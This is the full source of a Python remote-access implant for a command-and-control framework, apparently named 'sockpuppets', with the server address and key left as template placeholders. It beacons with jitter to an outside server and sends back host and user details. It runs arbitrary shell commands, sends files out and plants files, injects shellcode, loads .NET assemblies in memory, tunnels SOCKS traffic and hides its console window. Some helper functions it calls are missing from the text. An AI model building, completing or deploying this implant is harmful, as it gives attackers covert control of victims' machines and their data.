#!/usr/bin/env python3
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys
import urllib.request
import urllib.error
import ssl
import time
import random

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
C2_SCHEME = "{{C2_SCHEME}}"
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}
ENCRYPTION_KEY = b"{{ENCRYPTION_KEY}}"
VERIFY_SSL = {{VERIFY_SSL}}

BASE_URL = f"{C2_SCHEME}://{SERVER_HOST}:{SERVER_PORT}"


def _derive_aes_key(key):
    import hashlib
    return hashlib.sha256(key).digest()

def simple_encrypt(data: str) -> str:
    return wire_encrypt(data)

def simple_decrypt(data: str) -> str:
    return wire_decrypt(data)

def stealth_sleep(seconds):
    secret = bytearray(ENCRYPTION_KEY)
    try:
        globals()['sleep_encrypt'](seconds, secret)
        return
    except Exception:
        sleep_mask(seconds)

def sleep_mask(seconds):
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    src = b'sockpuppets-sleep-mask'
    try:
        key = os.urandom(32)
        nonce = os.urandom(12)
        ct = AESGCM(key).encrypt(nonce, src, b'sockpuppets-sleep-mask-v1')
    except Exception:
        time.sleep(seconds)
        return
    time.sleep(seconds)
    try:
        AESGCM(key).decrypt(nonce, ct, b'sockpuppets-sleep-mask-v1')
    except Exception:
        pass


def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount
    return random.uniform(max(0, min_sleep), max_sleep)


def get_metadata():
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def _handle_fs(command: str) -> str:
    import os, base64
    if command.startswith('__fs:ls:'):
        path = command[8:] or '.'
        try:
            entries = []
            for name in os.listdir(path):
                full = os.path.join(path, name)
                try:
                    st = os.stat(full)
                    prefix = 'd' if os.path.isdir(full) else '-'
                    entries.append(f"{prefix} {st.st_size:>12}  {name}")
                except OSError:
                    entries.append(f"? {'?':>12}  {name}")
            return '\n'.join(entries) if entries else 'Directory is empty'
        except Exception as e:
            return f"Error: {e}"
    if command.startswith('__fs:get:'):
        path = command[9:]
        if not os.path.isfile(path):
            return 'Error: not a file'
        if os.path.getsize(path) > 2 * 1024 * 1024:
            return 'Error: file too large (>2MB)'
        return 'FILE:' + base64.b64encode(open(path, 'rb').read()).decode()
    if command.startswith('__fs:put:'):
        rest = command[9:]
        path, _, b64 = rest.partition('\t')
        data = base64.b64decode(b64)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)
        return f'uploaded {len(data)} bytes to {path}'
    return 'Error: unknown fs command'


_socks_connections = {}

def _handle_socks_command(cmd_data, pending_results):
    cmd_type = cmd_data.get('type', '')
    conn_id = cmd_data.get('conn_id', '')
    if cmd_type == 'socks_init':
        return
    if cmd_type == 'socks_connect':
        host = cmd_data.get('host', '')
        port = cmd_data.get('port', 0)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.setblocking(False)
            _socks_connections[conn_id] = sock
            pending_results.append({'type': 'socks_connect_ack', 'conn_id': conn_id, 'success': True})
        except Exception:
            pending_results.append({'type': 'socks_connect_ack', 'conn_id': conn_id, 'success': False})
        return
    if cmd_type == 'socks_send':
        sock = _socks_connections.get(conn_id)
        if sock:
            try:
                raw = base64.b64decode(cmd_data.get('data', ''))
                sock.setblocking(True)
                sock.settimeout(5)
                sock.sendall(raw)
            except Exception:
                pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
                _socks_close(conn_id)
        return
    if cmd_type == 'socks_close':
        _socks_close(conn_id)
        return

def _socks_close(conn_id):
    sock = _socks_connections.pop(conn_id, None)
    if sock:
        try:
            sock.close()
        except Exception:
            pass

def _drain_socks_data(pending_results):
    for conn_id, sock in list(_socks_connections.items()):
        try:
            sock.setblocking(False)
            data = b''
            closed = False
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        closed = True
                        break
                    data += chunk
                except (BlockingIOError, OSError):
                    break
            if data:
                pending_results.append({
                    'type': 'socks_data', 'conn_id': conn_id,
                    'data': base64.b64encode(data).decode()
                })
            if closed:
                pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
                _socks_close(conn_id)
        except Exception:
            pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
            _socks_close(conn_id)


def _handle_bof(command: str) -> str:
    import base64, tempfile, os
    parts = command.split(':', 3)
    if len(parts) < 4:
        return 'Error: invalid BOF format (expected __bof:entry:args_b64:bof_data)'
    entry = parts[1]
    args_b64 = parts[2]
    bof_b64 = parts[3]
    try:
        bof_data = base64.b64decode(bof_b64)
        args_data = base64.b64decode(args_b64) if args_b64 else b''
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if sys.platform != 'win32':
        return f'BOF received: {len(bof_data)} bytes, entry={entry}, args={len(args_data)} bytes (not Windows, skipping execution)'
    try:
        import ctypes
        tmp = tempfile.NamedTemporaryFile(suffix='.bin', delete=False)
        tmp.write(bof_data)
        tmp.close()
        try:
            lib = ctypes.CDLL(tmp.name)
            func = getattr(lib, entry, None)
            if func:
                func()
                result = f'BOF executed: entry={entry}, size={len(bof_data)} bytes'
            else:
                result = f'BOF loaded but entry "{entry}" not found (available: COFF object)'
        except OSError as e:
            result = f'BOF load error (expected for raw COFF): {e}'
        finally:
            os.unlink(tmp.name)
        return result
    except Exception as e:
        return f'BOF error: {e}'


def _handle_shinject(command: str) -> str:
    import base64, ctypes, threading
    sc_b64 = command.split(':', 1)[1] if ':' in command else ''
    try:
        sc = base64.b64decode(sc_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not sc:
        return 'Error: empty shellcode'
    try:
        if sys.platform == 'win32':
            k32 = ctypes.windll.kernel32
            ptr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
            if not ptr:
                return 'Error: VirtualAlloc failed'
            ctypes.memmove(ptr, sc, len(sc))
            ht = k32.CreateThread(0, 0, ptr, 0, 0, 0)
            if not ht:
                return 'Error: CreateThread failed'
            return f'Shellcode injected: {len(sc)} bytes, thread handle={ht}'
        else:
            import mmap
            mm = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
            mm.write(sc)
            cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
            t = threading.Thread(target=cfunc)
            t.daemon = True
            t.start()
            return f'Shellcode injected: {len(sc)} bytes (Linux/mmap)'
    except Exception as e:
        return f'Shellcode injection error: {e}'


def _handle_asm(command: str) -> str:
    if sys.platform != 'win32':
        return 'Error: execute-assembly is Windows-only'
    parts = command.split(':', 2)
    args_str = parts[1] if len(parts) > 1 else ''
    asm_b64 = parts[2] if len(parts) > 2 else ''
    try:
        import base64
        asm_data = base64.b64decode(asm_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not asm_data:
        return 'Error: empty assembly'
    try:
        import clr
        import System
        from System.Reflection import Assembly
        asm_bytes = System.Array[System.Byte](asm_data)
        assembly = Assembly.Load(asm_bytes)
        entry = assembly.EntryPoint
        if not entry:
            return 'Error: assembly has no entry point'
        argv = args_str.split() if args_str else []
        params = entry.GetParameters()
        if len(params) == 1:
            args_array = System.Array[System.String](argv)
            result = entry.Invoke(None, System.Array[System.Object]([args_array]))
        else:
            result = entry.Invoke(None, None)
        return f'Assembly executed: {result}' if result else 'Assembly executed (no output)'
    except ImportError:
        return f'Error: execute-assembly requires pythonnet (clr module). Assembly received: {len(asm_data)} bytes'
    except Exception as e:
        return f'Assembly execution error: {e}'


def execute_command(command: str) -> str:
    if str(command).startswith('__hd:'):
        return hidden_desktop(command)
    if str(command).startswith('__px:'):
        return postex(command)
    if str(command).startswith('__fs:'):
        return _handle_fs(command)
    if str(command).startswith('__bof:'):
        return _handle_bof(command)
    if str(command).startswith('__shinject:'):
        return _handle_shinject(command)
    if str(command).startswith('__asm:'):
        return _handle_asm(command)
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"
        if sys.platform == 'win32':
            CREATE_NO_WINDOW = 0x08000000
            parts = command.split()
            try:
                result = subprocess.run(parts, capture_output=True, text=True, timeout=30,
                                         cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
                output = result.stdout + result.stderr
                if output.strip():
                    return output
            except (FileNotFoundError, OSError):
                pass
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd())
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"
    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


def http_request(url: str, data: str = None) -> str:
    ctx = None
    if not VERIFY_SSL and C2_SCHEME == 'https':
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    if data is not None:
        req = urllib.request.Request(url, data=data.encode(), headers=headers, method='POST')
    else:
        req = urllib.request.Request(url, headers=headers, method='GET')
    try:
        if ctx:
            response = urllib.request.urlopen(req, context=ctx, timeout=60)
        else:
            response = urllib.request.urlopen(req, timeout=60)
        return response.read().decode()
    except Exception:
        return ""


def connect_to_server():
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER
    agent_id = None
    pending_results = []

    while True:
        try:
            if not agent_id:
                metadata = get_metadata()
                metadata['mode'] = 'beacon'
                metadata['beacon_interval'] = beacon_interval
                metadata['beacon_jitter'] = beacon_jitter
                register_msg = {'type': 'register', 'metadata': metadata}
                encrypted = simple_encrypt(json.dumps(register_msg))
                response = http_request(f"{BASE_URL}/submit-form", encrypted)
                if response:
                    decrypted = simple_decrypt(response)
                    data = json.loads(decrypted)
                    if data.get('type') in ['registered', 'checkin_ack']:
                        agent_id = data.get('agent_id', '')
                if not agent_id:
                    time.sleep(5)
                    continue

            _drain_socks_data(pending_results)

            # Checkin with results
            checkin_msg = {
                'type': 'checkin',
                'agent_id': agent_id,
                'metadata': get_metadata(),
                'results': pending_results
            }
            checkin_msg['metadata']['mode'] = 'beacon'
            checkin_msg['metadata']['beacon_interval'] = beacon_interval
            encrypted = simple_encrypt(json.dumps(checkin_msg))
            response = http_request(f"{BASE_URL}/api/v1/update", encrypted)
            pending_results = []

            if response:
                decrypted = simple_decrypt(response)
                data = json.loads(decrypted)

                if data.get('type') == 'registered':
                    agent_id = data.get('agent_id', '')
                    continue

                if data.get('type') == 'commands':
                    for cmd_data in data.get('commands', []):
                        cmd_type = cmd_data.get('type', '')
                        if cmd_type in ('socks_init', 'socks_connect', 'socks_send', 'socks_close'):
                            _handle_socks_command(cmd_data, pending_results)
                            continue
                        command = cmd_data.get('command', '')
                        cmd_id = cmd_data.get('command_id', '')
                        if command.startswith('__set_interval:'):
                            try:
                                beacon_interval = int(command.split(':')[1])
                            except (ValueError, IndexError):
                                pass
                            continue
                        if command == '__kill':
                            sys.exit(0)
                        if command.startswith('__dormant:'):
                            try:
                                hours = float(command.split(':')[1])
                                secs = int(hours * 3600)
                                pending_results.append({
                                    'type': 'response',
                                    'output': f'Going dormant for {hours}h ({secs}s)',
                                    'command': command,
                                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                                })
                                dormant_msg = {
                                    'type': 'checkin', 'agent_id': agent_id,
                                    'metadata': get_metadata(), 'results': pending_results
                                }
                                dormant_msg['metadata']['mode'] = 'beacon'
                                dormant_msg['metadata']['beacon_interval'] = beacon_interval
                                http_request(f"{BASE_URL}/api/v1/update",
                                             simple_encrypt(json.dumps(dormant_msg)))
                                pending_results = []
                                time.sleep(secs)
                            except (ValueError, IndexError):
                                pass
                            continue
                        if command.startswith('__upgrade_ws:'):
                            try:
                                ws_data = json.loads(command.split(':', 1)[1])
                                _upgrade_to_websocket(agent_id, ws_data.get('ws_host'), ws_data.get('ws_port'))
                                return
                            except Exception:
                                pending_results.append({
                                    'type': 'response',
                                    'output': 'WebSocket upgrade failed',
                                    'command': 'upgrade_ws',
                                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                                })
                            continue
                        if command:
                            output = execute_command(command)
                            result_entry = {
                                'type': 'response',
                                'output': output,
                                'command': command,
                                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                            }
                            if cmd_id:
                                result_entry['command_id'] = cmd_id
                            pending_results.append(result_entry)

            sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
            stealth_sleep(sleep_time)

        except Exception:
            time.sleep(5)


def _upgrade_to_websocket(agent_id, ws_host, ws_port):
    try:
        import asyncio
        import websockets

        async def ws_connect():
            uri = f"ws://{ws_host}:{ws_port}"
            async with websockets.connect(uri, max_size=10485760) as websocket:
                checkin_msg = {'type': 'checkin', 'agent_id': agent_id, 'metadata': get_metadata()}
                encrypted = simple_encrypt(json.dumps(checkin_msg))
                await websocket.send(encrypted)
                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)
                if reg_data.get('type') in ['registered', 'checkin_ack']:
                    async for message in websocket:
                        try:
                            decrypted = simple_decrypt(message)
                            data = json.loads(decrypted)
                            if data.get('type') == 'command':
                                output = execute_command(data.get('command', ''))
                                resp = {'type': 'response', 'output': output}
                                await websocket.send(simple_encrypt(json.dumps(resp)))
                            elif data.get('type') == 'kill':
                                sys.exit(0)
                        except Exception:
                            pass
        asyncio.run(ws_connect())
    except (ImportError, Exception):
        pass


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass
    while True:
        try:
            connect_to_server()
            break
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(10)
